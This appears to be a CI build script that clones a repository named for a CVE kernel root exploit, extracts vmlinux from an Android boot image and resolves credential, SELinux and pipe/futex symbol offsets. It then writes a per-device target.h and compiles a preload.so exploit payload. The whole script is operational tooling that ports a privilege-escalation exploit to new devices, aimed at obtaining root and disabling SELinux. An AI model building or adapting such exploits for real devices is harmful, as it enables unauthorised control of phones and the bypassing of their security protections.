#!/bin/bash
set -e
DEVICE="$1"

echo "=== Cloning source ==="
git clone --depth 1 https://github.com/woshimaniubi8/CVE-2026-43499-root-KernelSU.git jailbreak
cd jailbreak

echo "=== Inspecting target.h template ==="
# 先找一个已有的 target.h 作为格式参考
REF_TARGET=$(find . -name "target.h" -not -path "./.git/*" | head -n1)
if [ -n "$REF_TARGET" ]; then
    echo "Reference target.h found at: $REF_TARGET"
    head -n 60 "$REF_TARGET"
else
    echo "No reference target.h found, will use generic GhostLock format"
fi

echo "=== Extracting vmlinux from boot.img ==="
mkdir -p /tmp/kextract
cd /tmp/kextract

# 方法1: vmlinux-to-elf
python3 -c "
from vmlinux_to_elf.extract_vmlinux import extract_vmlinux
extract_vmlinux('${GITHUB_WORKSPACE:-..}/images/boot.img', 'vmlinux')
" 2>/dev/null || true

# 如果方法1失败，手动解压
if [ ! -f vmlinux ] || [ "$(stat -c%s vmlinux 2>/dev/null || echo 0)" -lt 1000000 ]; then
    echo "[!] vmlinux-to-elf failed, trying manual extraction..."
    python3 << 'PYEOF'
import struct, os, subprocess

with open('${GITHUB_WORKSPACE:-..}/images/boot.img', 'rb') as f:
    hdr = f.read(2048)
    if hdr[:8] == b'ANDROID!':
        kernel_size = struct.unpack('<I', hdr[8:12])[0]
        page_size = struct.unpack('<I', hdr[36:40])[0]
        f.seek(page_size)
        kernel_raw = f.read(kernel_size)
    else:
        f.seek(0)
        kernel_raw = f.read()

    with open('kernel_raw.gz', 'wb') as o:
        o.write(kernel_raw)

# Try decompress
for cmd, name in [
    ('gzip -dc kernel_raw.gz > kernel_raw 2>/dev/null', 'gzip'),
    ('lz4 -dc kernel_raw.gz > kernel_raw 2>/dev/null', 'lz4'),
    ('zstd -dc kernel_raw.gz > kernel_raw 2>/dev/null', 'zstd'),
    ('xz -dc kernel_raw.gz > kernel_raw 2>/dev/null', 'xz'),
]:
    r = subprocess.run(cmd, shell=True)
    if r.returncode == 0 and os.path.getsize('kernel_raw') > 1000000:
        print(f'[+] Decompressed with {name}')
        break
else:
    # Maybe uncompressed already
    import shutil
    shutil.copy('kernel_raw.gz', 'kernel_raw')
PYEOF

    # Check if kernel_raw is ELF
    if file kernel_raw | grep -q ELF; then
        cp kernel_raw vmlinux
    else
        echo "[!] Manual extraction also failed"
        exit 1
    fi
fi

echo "[+] vmlinux size: $(stat -c%s vmlinux 2>/dev/null || echo 0)"

echo "=== Extracting kernel base and symbols ==="
# 获取内核基址（从 _text 符号）
KERNEL_BASE=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep ' T _text$' | awk '{print "0x"$1}' | head -n1)
if [ -z "$KERNEL_BASE" ]; then
    # fallback: 常见 Android aarch64 基址
    KERNEL_BASE="0xffffffc008000000"
    echo "[!] Could not detect kernel base, using fallback: $KERNEL_BASE"
else
    echo "[+] Kernel base: $KERNEL_BASE"
fi

# 提取关键符号
get_sym() {
    local name="$1"
    local addr=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep " [Tt] $name\$" | awk '{print "0x"$1}' | head -n1)
    if [ -n "$addr" ] && [ "$addr" != "0x" ]; then
        python3 -c "print(hex($addr - $KERNEL_BASE))"
    else
        echo "0xDEADBEEF"
    fi
}

INIT_TASK=$(get_sym "init_task")
INIT_CRED=$(get_sym "init_cred")
COMMIT_CREDS=$(get_sym "commit_creds")
PREPARE_KERNEL_CRED=$(get_sym "prepare_kernel_cred")
OVERRIDE_CRED=$(get_sym "override_creds")
REVERT_CRED=$(get_sym "revert_creds")
SELINUX_ENFORCING=$(get_sym "selinux_enforcing")
SELINUX_STATE=$(get_sym "selinux_state")
SELINUX_SS=$(get_sym "selinux_ss")
PIPE_BUF_OPS=$(get_sym "pipe_buf_ops")
ANON_PIPE_BUF_OPS=$(get_sym "anon_pipe_buf_ops")

echo "Symbol offsets:"
echo "  INIT_TASK: $INIT_TASK"
echo "  INIT_CRED: $INIT_CRED"
echo "  COMMIT_CREDS: $COMMIT_CREDS"
echo "  PREPARE_KERNEL_CRED: $PREPARE_KERNEL_CRED"
echo "  SELINUX_ENFORCING: $SELINUX_ENFORCING"

echo "=== Extracting BTF struct offsets ==="
# 尝试用 bpftool 提取 BTF
BTF_TASK_PID="0x5E0"
BTF_TASK_CRED="0x778"
BTF_TASK_MM="0x520"
BTF_TASK_COMM="0x7B0"
BTF_TASK_FLAGS="0x448"

if command -v bpftool >/dev/null 2>&1; then
    bpftool btf dump file vmlinux format c > /tmp/vmlinux.h 2>/dev/null || true
    if [ -f /tmp/vmlinux.h ]; then
        # 简单 grep 提取（不精确，但比瞎猜好）
        BTF_TASK_PID=$(grep -A 200 "struct task_struct {" /tmp/vmlinux.h | grep -m1 "pid" | grep -oE "0x[0-9a-f]+" | head -n1 || echo "0x5E0")
        BTF_TASK_CRED=$(grep -A 200 "struct task_struct {" /tmp/vmlinux.h | grep -m1 "cred;" | grep -oE "0x[0-9a-f]+" | head -n1 || echo "0x778")
    fi
fi

echo "=== Generating target.h ==="
cd "${GITHUB_WORKSPACE:-..}/jailbreak"
mkdir -p "src/targets/$DEVICE"

cat > "src/targets/$DEVICE/target.h" << EOF
/* Auto-generated target.h for $DEVICE */
#ifndef TARGET_H
#define TARGET_H

#define KERNEL_BASE     ${KERNEL_BASE}ULL

#define INIT_TASK       ${INIT_TASK}
#define INIT_CRED       ${INIT_CRED}
#define COMMIT_CREDS    ${COMMIT_CREDS}
#define PREPARE_KERNEL_CRED ${PREPARE_KERNEL_CRED}
#define OVERRIDE_CRED   ${OVERRIDE_CRED}
#define REVERT_CRED     ${REVERT_CRED}

#define SELINUX_ENFORCING ${SELINUX_ENFORCING}
#define SELINUX_STATE   ${SELINUX_STATE}
#define SELINUX_SS      ${SELINUX_SS}

#define PIPE_BUF_OPS    ${PIPE_BUF_OPS}
#define ANON_PIPE_BUF_OPS ${ANON_PIPE_BUF_OPS}

/* Task struct offsets - auto-detected or fallback defaults */
#define TASK_STRUCT_PID_OFFSET      ${BTF_TASK_PID}
#define TASK_STRUCT_CRED_OFFSET     ${BTF_TASK_CRED}
#define TASK_STRUCT_MM_OFFSET       ${BTF_TASK_MM}
#define TASK_STRUCT_COMM_OFFSET     ${BTF_TASK_COMM}
#define TASK_STRUCT_FLAGS_OFFSET    ${BTF_TASK_FLAGS}

/* rt_mutex_waiter offsets - common defaults for 5.4/5.10 */
#define RT_MUTEX_WAITER_LIST_OFFSET     0x00
#define RT_MUTEX_WAITER_PI_LIST_OFFSET  0x10
#define RT_MUTEX_WAITER_TASK_OFFSET     0x30

/* futex/pipe common defaults */
#define FUTEX_WAITER_LIST_OFFSET    0x18
#define PIPE_BUF_OFFSET             0x40
#define PIPE_BUF_OPS_OFFSET         0x58

#endif /* TARGET_H */
EOF

echo "[+] Generated src/targets/$DEVICE/target.h"

echo "=== Building preload.so ==="
make PROJECT="$DEVICE" -j$(nproc)

echo "=== Copying outputs ==="
cp "build/$DEVICE/bin/preload.so" ../preload.so
cp "src/targets/$DEVICE/target.h" ../target.h
echo "[+] Build complete: preload.so"
